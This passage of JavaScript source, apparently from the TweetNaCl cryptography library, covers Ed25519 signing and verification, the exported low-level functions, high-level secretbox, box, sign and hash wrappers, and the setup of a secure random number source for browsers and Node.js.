  scalarmult(p, q, s);
}

function crypto_sign_keypair(pk, sk, seeded) {
  var d = new Uint8Array(64);
  var p = [gf(), gf(), gf(), gf()];
  var i;

  if (!seeded) randombytes(sk, 32);
  crypto_hash(d, sk, 32);
  d[0] &= 248;
  d[31] &= 127;
  d[31] |= 64;

  scalarbase(p, d);
  pack(pk, p);

  for (i = 0; i < 32; i++) sk[i+32] = pk[i];
  return 0;
}

var L = new Float64Array([0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58, 0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x10]);

function modL(r, x) {
  var carry, i, j, k;
  for (i = 63; i >= 32; --i) {
    carry = 0;
    for (j = i - 32, k = i - 12; j < k; ++j) {
      x[j] += carry - 16 * x[i] * L[j - (i - 32)];
      carry = (x[j] + 128) >> 8;
      x[j] -= carry * 256;
    }
    x[j] += carry;
    x[i] = 0;
  }
  carry = 0;
  for (j = 0; j < 32; j++) {
    x[j] += carry - (x[31] >> 4) * L[j];
    carry = x[j] >> 8;
    x[j] &= 255;
  }
  for (j = 0; j < 32; j++) x[j] -= carry * L[j];
  for (i = 0; i < 32; i++) {
    x[i+1] += x[i] >> 8;
    r[i] = x[i] & 255;
  }
}

function reduce(r) {
  var x = new Float64Array(64), i;
  for (i = 0; i < 64; i++) x[i] = r[i];
  for (i = 0; i < 64; i++) r[i] = 0;
  modL(r, x);
}

// Note: difference from C - smlen returned, not passed as argument.
function crypto_sign(sm, m, n, sk) {
  var d = new Uint8Array(64), h = new Uint8Array(64), r = new Uint8Array(64);
  var i, j, x = new Float64Array(64);
  var p = [gf(), gf(), gf(), gf()];

  crypto_hash(d, sk, 32);
  d[0] &= 248;
  d[31] &= 127;
  d[31] |= 64;

  var smlen = n + 64;
  for (i = 0; i < n; i++) sm[64 + i] = m[i];
  for (i = 0; i < 32; i++) sm[32 + i] = d[32 + i];

  crypto_hash(r, sm.subarray(32), n+32);
  reduce(r);
  scalarbase(p, r);
  pack(sm, p);

  for (i = 32; i < 64; i++) sm[i] = sk[i];
  crypto_hash(h, sm, n + 64);
  reduce(h);

  for (i = 0; i < 64; i++) x[i] = 0;
  for (i = 0; i < 32; i++) x[i] = r[i];
  for (i = 0; i < 32; i++) {
    for (j = 0; j < 32; j++) {
      x[i+j] += h[i] * d[j];
    }
  }

  modL(sm.subarray(32), x);
  return smlen;
}

function unpackneg(r, p) {
  var t = gf(), chk = gf(), num = gf(),
      den = gf(), den2 = gf(), den4 = gf(),
      den6 = gf();

  set25519(r[2], gf1);
  unpack25519(r[1], p);
  S(num, r[1]);
  M(den, num, D);
  Z(num, num, r[2]);
  A(den, r[2], den);

  S(den2, den);
  S(den4, den2);
  M(den6, den4, den2);
  M(t, den6, num);
  M(t, t, den);

  pow2523(t, t);
  M(t, t, num);
  M(t, t, den);
  M(t, t, den);
  M(r[0], t, den);

  S(chk, r[0]);
  M(chk, chk, den);
  if (neq25519(chk, num)) M(r[0], r[0], I);

  S(chk, r[0]);
  M(chk, chk, den);
  if (neq25519(chk, num)) return -1;

  if (par25519(r[0]) === (p[31]>>7)) Z(r[0], gf0, r[0]);

  M(r[3], r[0], r[1]);
  return 0;
}

function crypto_sign_open(m, sm, n, pk) {
  var i, mlen;
  var t = new Uint8Array(32), h = new Uint8Array(64);
  var p = [gf(), gf(), gf(), gf()],
      q = [gf(), gf(), gf(), gf()];

  mlen = -1;
  if (n < 64) return -1;

  if (unpackneg(q, pk)) return -1;

  for (i = 0; i < n; i++) m[i] = sm[i];
  for (i = 0; i < 32; i++) m[i+32] = pk[i];
  crypto_hash(h, m, n);
  reduce(h);
  scalarmult(p, q, h);

  scalarbase(q, sm.subarray(32));
  add(p, q);
  pack(t, p);

  n -= 64;
  if (crypto_verify_32(sm, 0, t, 0)) {
    for (i = 0; i < n; i++) m[i] = 0;
    return -1;
  }

  for (i = 0; i < n; i++) m[i] = sm[i + 64];
  mlen = n;
  return mlen;
}

var crypto_secretbox_KEYBYTES = 32,
    crypto_secretbox_NONCEBYTES = 24,
    crypto_secretbox_ZEROBYTES = 32,
    crypto_secretbox_BOXZEROBYTES = 16,
    crypto_scalarmult_BYTES = 32,
    crypto_scalarmult_SCALARBYTES = 32,
    crypto_box_PUBLICKEYBYTES = 32,
    crypto_box_SECRETKEYBYTES = 32,
    crypto_box_BEFORENMBYTES = 32,
    crypto_box_NONCEBYTES = crypto_secretbox_NONCEBYTES,
    crypto_box_ZEROBYTES = crypto_secretbox_ZEROBYTES,
    crypto_box_BOXZEROBYTES = crypto_secretbox_BOXZEROBYTES,
    crypto_sign_BYTES = 64,
    crypto_sign_PUBLICKEYBYTES = 32,
    crypto_sign_SECRETKEYBYTES = 64,
    crypto_sign_SEEDBYTES = 32,
    crypto_hash_BYTES = 64;

nacl.lowlevel = {
  crypto_core_hsalsa20: crypto_core_hsalsa20,
  crypto_stream_xor: crypto_stream_xor,
  crypto_stream: crypto_stream,
  crypto_stream_salsa20_xor: crypto_stream_salsa20_xor,
  crypto_stream_salsa20: crypto_stream_salsa20,
  crypto_onetimeauth: crypto_onetimeauth,
  crypto_onetimeauth_verify: crypto_onetimeauth_verify,
  crypto_verify_16: crypto_verify_16,
  crypto_verify_32: crypto_verify_32,
  crypto_secretbox: crypto_secretbox,
  crypto_secretbox_open: crypto_secretbox_open,
  crypto_scalarmult: crypto_scalarmult,
  crypto_scalarmult_base: crypto_scalarmult_base,
  crypto_box_beforenm: crypto_box_beforenm,
  crypto_box_afternm: crypto_box_afternm,
  crypto_box: crypto_box,
  crypto_box_open: crypto_box_open,
  crypto_box_keypair: crypto_box_keypair,
  crypto_hash: crypto_hash,
  crypto_sign: crypto_sign,
  crypto_sign_keypair: crypto_sign_keypair,
  crypto_sign_open: crypto_sign_open,

  crypto_secretbox_KEYBYTES: crypto_secretbox_KEYBYTES,
  crypto_secretbox_NONCEBYTES: crypto_secretbox_NONCEBYTES,
  crypto_secretbox_ZEROBYTES: crypto_secretbox_ZEROBYTES,
  crypto_secretbox_BOXZEROBYTES: crypto_secretbox_BOXZEROBYTES,
  crypto_scalarmult_BYTES: crypto_scalarmult_BYTES,
  crypto_scalarmult_SCALARBYTES: crypto_scalarmult_SCALARBYTES,
  crypto_box_PUBLICKEYBYTES: crypto_box_PUBLICKEYBYTES,
  crypto_box_SECRETKEYBYTES: crypto_box_SECRETKEYBYTES,
  crypto_box_BEFORENMBYTES: crypto_box_BEFORENMBYTES,
  crypto_box_NONCEBYTES: crypto_box_NONCEBYTES,
  crypto_box_ZEROBYTES: crypto_box_ZEROBYTES,
  crypto_box_BOXZEROBYTES: crypto_box_BOXZEROBYTES,
  crypto_sign_BYTES: crypto_sign_BYTES,
  crypto_sign_PUBLICKEYBYTES: crypto_sign_PUBLICKEYBYTES,
  crypto_sign_SECRETKEYBYTES: crypto_sign_SECRETKEYBYTES,
  crypto_sign_SEEDBYTES: crypto_sign_SEEDBYTES,
  crypto_hash_BYTES: crypto_hash_BYTES
};

/* High-level API */

function checkLengths(k, n) {
  if (k.length !== crypto_secretbox_KEYBYTES) throw new Error('bad key size');
  if (n.length !== crypto_secretbox_NONCEBYTES) throw new Error('bad nonce size');
}

function checkBoxLengths(pk, sk) {
  if (pk.length !== crypto_box_PUBLICKEYBYTES) throw new Error('bad public key size');
  if (sk.length !== crypto_box_SECRETKEYBYTES) throw new Error('bad secret key size');
}

function checkArrayTypes() {
  for (var i = 0; i < arguments.length; i++) {
    if (!(arguments[i] instanceof Uint8Array))
      throw new TypeError('unexpected type, use Uint8Array');
  }
}

function cleanup(arr) {
  for (var i = 0; i < arr.length; i++) arr[i] = 0;
}

nacl.randomBytes = function(n) {
  var b = new Uint8Array(n);
  randombytes(b, n);
  return b;
};

nacl.secretbox = function(msg, nonce, key) {
  checkArrayTypes(msg, nonce, key);
  checkLengths(key, nonce);
  var m = new Uint8Array(crypto_secretbox_ZEROBYTES + msg.length);
  var c = new Uint8Array(m.length);
  for (var i = 0; i < msg.length; i++) m[i+crypto_secretbox_ZEROBYTES] = msg[i];
  crypto_secretbox(c, m, m.length, nonce, key);
  return c.subarray(crypto_secretbox_BOXZEROBYTES);
};

nacl.secretbox.open = function(box, nonce, key) {
  checkArrayTypes(box, nonce, key);
  checkLengths(key, nonce);
  var c = new Uint8Array(crypto_secretbox_BOXZEROBYTES + box.length);
  var m = new Uint8Array(c.length);
  for (var i = 0; i < box.length; i++) c[i+crypto_secretbox_BOXZEROBYTES] = box[i];
  if (c.length < 32) return null;
  if (crypto_secretbox_open(m, c, c.length, nonce, key) !== 0) return null;
  return m.subarray(crypto_secretbox_ZEROBYTES);
};

nacl.secretbox.keyLength = crypto_secretbox_KEYBYTES;
nacl.secretbox.nonceLength = crypto_secretbox_NONCEBYTES;
nacl.secretbox.overheadLength = crypto_secretbox_BOXZEROBYTES;

nacl.scalarMult = function(n, p) {
  checkArrayTypes(n, p);
  if (n.length !== crypto_scalarmult_SCALARBYTES) throw new Error('bad n size');
  if (p.length !== crypto_scalarmult_BYTES) throw new Error('bad p size');
  var q = new Uint8Array(crypto_scalarmult_BYTES);
  crypto_scalarmult(q, n, p);
  return q;
};

nacl.scalarMult.base = function(n) {
  checkArrayTypes(n);
  if (n.length !== crypto_scalarmult_SCALARBYTES) throw new Error('bad n size');
  var q = new Uint8Array(crypto_scalarmult_BYTES);
  crypto_scalarmult_base(q, n);
  return q;
};

nacl.scalarMult.scalarLength = crypto_scalarmult_SCALARBYTES;
nacl.scalarMult.groupElementLength = crypto_scalarmult_BYTES;

nacl.box = function(msg, nonce, publicKey, secretKey) {
  var k = nacl.box.before(publicKey, secretKey);
  return nacl.secretbox(msg, nonce, k);
};

nacl.box.before = function(publicKey, secretKey) {
  checkArrayTypes(publicKey, secretKey);
  checkBoxLengths(publicKey, secretKey);
  var k = new Uint8Array(crypto_box_BEFORENMBYTES);
  crypto_box_beforenm(k, publicKey, secretKey);
  return k;
};

nacl.box.after = nacl.secretbox;

nacl.box.open = function(msg, nonce, publicKey, secretKey) {
  var k = nacl.box.before(publicKey, secretKey);
  return nacl.secretbox.open(msg, nonce, k);
};

nacl.box.open.after = nacl.secretbox.open;

nacl.box.keyPair = function() {
  var pk = new Uint8Array(crypto_box_PUBLICKEYBYTES);
  var sk = new Uint8Array(crypto_box_SECRETKEYBYTES);
  crypto_box_keypair(pk, sk);
  return {publicKey: pk, secretKey: sk};
};

nacl.box.keyPair.fromSecretKey = function(secretKey) {
  checkArrayTypes(secretKey);
  if (secretKey.length !== crypto_box_SECRETKEYBYTES)
    throw new Error('bad secret key size');
  var pk = new Uint8Array(crypto_box_PUBLICKEYBYTES);
  crypto_scalarmult_base(pk, secretKey);
  return {publicKey: pk, secretKey: new Uint8Array(secretKey)};
};

nacl.box.publicKeyLength = crypto_box_PUBLICKEYBYTES;
nacl.box.secretKeyLength = crypto_box_SECRETKEYBYTES;
nacl.box.sharedKeyLength = crypto_box_BEFORENMBYTES;
nacl.box.nonceLength = crypto_box_NONCEBYTES;
nacl.box.overheadLength = nacl.secretbox.overheadLength;

nacl.sign = function(msg, secretKey) {
  checkArrayTypes(msg, secretKey);
  if (secretKey.length !== crypto_sign_SECRETKEYBYTES)
    throw new Error('bad secret key size');
  var signedMsg = new Uint8Array(crypto_sign_BYTES+msg.length);
  crypto_sign(signedMsg, msg, msg.length, secretKey);
  return signedMsg;
};

nacl.sign.open = function(signedMsg, publicKey) {
  checkArrayTypes(signedMsg, publicKey);
  if (publicKey.length !== crypto_sign_PUBLICKEYBYTES)
    throw new Error('bad public key size');
  var tmp = new Uint8Array(signedMsg.length);
  var mlen = crypto_sign_open(tmp, signedMsg, signedMsg.length, publicKey);
  if (mlen < 0) return null;
  var m = new Uint8Array(mlen);
  for (var i = 0; i < m.length; i++) m[i] = tmp[i];
  return m;
};

nacl.sign.detached = function(msg, secretKey) {
  var signedMsg = nacl.sign(msg, secretKey);
  var sig = new Uint8Array(crypto_sign_BYTES);
  for (var i = 0; i < sig.length; i++) sig[i] = signedMsg[i];
  return sig;
};

nacl.sign.detached.verify = function(msg, sig, publicKey) {
  checkArrayTypes(msg, sig, publicKey);
  if (sig.length !== crypto_sign_BYTES)
    throw new Error('bad signature size');
  if (publicKey.length !== crypto_sign_PUBLICKEYBYTES)
    throw new Error('bad public key size');
  var sm = new Uint8Array(crypto_sign_BYTES + msg.length);
  var m = new Uint8Array(crypto_sign_BYTES + msg.length);
  var i;
  for (i = 0; i < crypto_sign_BYTES; i++) sm[i] = sig[i];
  for (i = 0; i < msg.length; i++) sm[i+crypto_sign_BYTES] = msg[i];
  return (crypto_sign_open(m, sm, sm.length, publicKey) >= 0);
};

nacl.sign.keyPair = function() {
  var pk = new Uint8Array(crypto_sign_PUBLICKEYBYTES);
  var sk = new Uint8Array(crypto_sign_SECRETKEYBYTES);
  crypto_sign_keypair(pk, sk);
  return {publicKey: pk, secretKey: sk};
};

nacl.sign.keyPair.fromSecretKey = function(secretKey) {
  checkArrayTypes(secretKey);
  if (secretKey.length !== crypto_sign_SECRETKEYBYTES)
    throw new Error('bad secret key size');
  var pk = new Uint8Array(crypto_sign_PUBLICKEYBYTES);
  for (var i = 0; i < pk.length; i++) pk[i] = secretKey[32+i];
  return {publicKey: pk, secretKey: new Uint8Array(secretKey)};
};

nacl.sign.keyPair.fromSeed = function(seed) {
  checkArrayTypes(seed);
  if (seed.length !== crypto_sign_SEEDBYTES)
    throw new Error('bad seed size');
  var pk = new Uint8Array(crypto_sign_PUBLICKEYBYTES);
  var sk = new Uint8Array(crypto_sign_SECRETKEYBYTES);
  for (var i = 0; i < 32; i++) sk[i] = seed[i];
  crypto_sign_keypair(pk, sk, true);
  return {publicKey: pk, secretKey: sk};
};

nacl.sign.publicKeyLength = crypto_sign_PUBLICKEYBYTES;
nacl.sign.secretKeyLength = crypto_sign_SECRETKEYBYTES;
nacl.sign.seedLength = crypto_sign_SEEDBYTES;
nacl.sign.signatureLength = crypto_sign_BYTES;

nacl.hash = function(msg) {
  checkArrayTypes(msg);
  var h = new Uint8Array(crypto_hash_BYTES);
  crypto_hash(h, msg, msg.length);
  return h;
};

nacl.hash.hashLength = crypto_hash_BYTES;

nacl.verify = function(x, y) {
  checkArrayTypes(x, y);
  // Zero length arguments are considered not equal.
  if (x.length === 0 || y.length === 0) return false;
  if (x.length !== y.length) return false;
  return (vn(x, 0, y, 0, x.length) === 0) ? true : false;
};

nacl.setPRNG = function(fn) {
  randombytes = fn;
};

(function() {
  // Initialize PRNG if environment provides CSPRNG.
  // If not, methods calling randombytes will throw.
  var crypto = typeof self !== 'undefined' ? (self.crypto || self.msCrypto) : null;
  if (crypto && crypto.getRandomValues) {
    // Browsers.
    var QUOTA = 65536;
    nacl.setPRNG(function(x, n) {
      var i, v = new Uint8Array(n);
      for (i = 0; i < n; i += QUOTA) {
        crypto.getRandomValues(v.subarray(i, i + Math.min(n - i, QUOTA)));
      }
      for (i = 0; i < n; i++) x[i] = v[i];
      cleanup(v);
    });
  } else if (typeof require !== 'undefined') {
    // Node.js.
    crypto = require('crypto');
    if (crypto && crypto.randomBytes) {
      nacl.setPRNG(function(x, n) {
        var i, v = crypto.randomBytes(n);
        for (i = 0; i < n; i++) x[i] = v[i];
        cleanup(v);
      });
    }
  }
})();

})(typeof module !== 'undefined' && module.exports ? module.exports : (self.nacl = self.nacl || {}));
